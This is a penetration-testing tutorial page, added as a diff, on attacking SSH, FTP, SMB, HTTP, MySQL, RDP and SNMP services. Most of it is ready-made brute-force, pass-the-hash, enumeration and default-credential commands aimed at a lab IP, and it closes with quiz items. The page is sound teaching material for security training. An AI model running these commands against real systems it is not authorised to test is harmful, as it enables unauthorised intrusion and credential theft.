@@ -1,0 +1,199 @@
+---
+title: Attacking Network Services
+description: Exploiting common network services during penetration testing.
+---
+
+# Attacking Network Services
+
+After scanning with Nmap and identifying open ports, the next step is to attack the services running on those ports. This guide covers the most common services you'll encounter and how to exploit them.
+
+## SSH (Port 22)
+
+### Brute Force
+```bash
+# Hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
+hydra -L users.txt -P passwords.txt ssh://10.10.10.5 -t 4
+
+# Medusa
+medusa -h 10.10.10.5 -u admin -P rockyou.txt -M ssh
+
+# Nmap script
+nmap -p 22 --script ssh-brute 10.10.10.5
+```
+
+### Default Credentials
+Always try common defaults first:
+- `root:root`, `root:toor`, `admin:admin`, `admin:password`
+
+### SSH Key Authentication
+```bash
+# If you find a private key (id_rsa)
+chmod 600 id_rsa
+ssh -i id_rsa user@10.10.10.5
+
+# If the key is password-protected, crack it
+ssh2john id_rsa > ssh_hash.txt
+john ssh_hash.txt --wordlist=rockyou.txt
+```
+
+## FTP (Port 21)
+
+### Anonymous Login
+```bash
+ftp 10.10.10.5
+# Username: anonymous
+# Password: (blank or any email)
+
+# Or with curl
+curl ftp://10.10.10.5 --user anonymous:anonymous
+```
+
+### Brute Force
+```bash
+hydra -l admin -P rockyou.txt ftp://10.10.10.5
+```
+
+### Nmap Enumeration
+```bash
+nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-brute 10.10.10.5
+```
+
+<TerminalWindow
+  title="FTP Anonymous Login"
+  command="ftp 10.10.10.5"
+  output="Connected to 10.10.10.5.
+220 (vsFTPd 3.0.3)
+Name: anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+ftp> ls
+-rw-r--r-- 1 0 0 1024 Jan 12 backup.zip
+-rw-r--r-- 1 0 0 512  Jan 12 credentials.txt"
+/>
+
+## SMB (Port 445/139)
+
+SMB is a goldmine for penetration testers — it often exposes shares, credentials, and vulnerabilities.
+
+### Enumeration
+```bash
+# List shares
+smbclient -L //10.10.10.5 -N          # No password
+smbclient -L //10.10.10.5 -U admin
+
+# Connect to a share
+smbclient //10.10.10.5/share -N
+smbclient //10.10.10.5/C$ -U admin
+
+# Enum4linux — comprehensive SMB enumeration
+enum4linux -a 10.10.10.5
+
+# CrackMapExec
+crackmapexec smb 10.10.10.5
+crackmapexec smb 10.10.10.5 --shares
+crackmapexec smb 10.10.10.5 -u admin -p password --shares
+```
+
+### Nmap SMB Scripts
+```bash
+nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 10.10.10.5
+nmap -p 445 --script smb-vuln* 10.10.10.5  # Check for EternalBlue, etc.
+```
+
+### Pass-the-Hash
+```bash
+# Use NTLM hash instead of password
+crackmapexec smb 10.10.10.5 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c
+smbclient //10.10.10.5/C$ -U admin --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c
+```
+
+## HTTP/HTTPS (Port 80/443)
+
+### Directory Enumeration
+```bash
+# Gobuster
+gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
+
+# Feroxbuster (recursive)
+feroxbuster -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+# Nikto — vulnerability scanner
+nikto -h http://10.10.10.5
+```
+
+### Default Credentials for Web Apps
+| Application | Default Credentials |
+|-------------|---------------------|
+| Apache Tomcat | `tomcat:tomcat`, `admin:admin` |
+| Jenkins | `admin:admin` |
+| WordPress | `admin:admin`, `admin:password` |
+| phpMyAdmin | `root:` (blank) |
+| Grafana | `admin:admin` |
+| Kibana | `elastic:changeme` |
+
+## MySQL (Port 3306)
+
+```bash
+# Connect
+mysql -h 10.10.10.5 -u root -p
+mysql -h 10.10.10.5 -u root --password=''  # Try blank password
+
+# Brute force
+hydra -l root -P rockyou.txt mysql://10.10.10.5
+
+# Nmap
+nmap -p 3306 --script mysql-info,mysql-databases,mysql-empty-password 10.10.10.5
+```
+
+## RDP (Port 3389)
+
+```bash
+# Brute force
+hydra -l administrator -P rockyou.txt rdp://10.10.10.5
+crowbar -b rdp -s 10.10.10.5/32 -u administrator -C rockyou.txt
+
+# Connect
+xfreerdp /u:administrator /p:password /v:10.10.10.5
+rdesktop 10.10.10.5 -u administrator -p password
+```
+
+## SNMP (Port 161 UDP)
+
+SNMP often leaks system information with default community strings.
+
+```bash
+# Enumerate with default community strings
+snmpwalk -c public -v1 10.10.10.5
+snmpwalk -c private -v1 10.10.10.5
+
+# Brute force community strings
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.5
+
+# Nmap
+nmap -sU -p 161 --script snmp-info,snmp-sysdescr 10.10.10.5
+```
+
+<InfoBox type="tip">
+Always check for default credentials before attempting brute force. Many systems are left with factory defaults — it takes 30 seconds and often works.
+</InfoBox>
+
+<Quiz
+  question="What tool is used for comprehensive SMB enumeration on Linux?"
+  answer="enum4linux"
+  hint="Run with -a flag for all checks: enum4linux -a 10.10.10.5"
+/>
+
+<Quiz
+  question="What is Pass-the-Hash?"
+  answer="Using an NTLM hash instead of a plaintext password to authenticate"
+  hint="You don't need to crack the hash — you can use it directly with tools like CrackMapExec."
+/>
+
+<Quiz
+  question="What Gobuster flag specifies file extensions to search for?"
+  answer="-x"
+  hint="Example: -x php,html,txt"
+/>
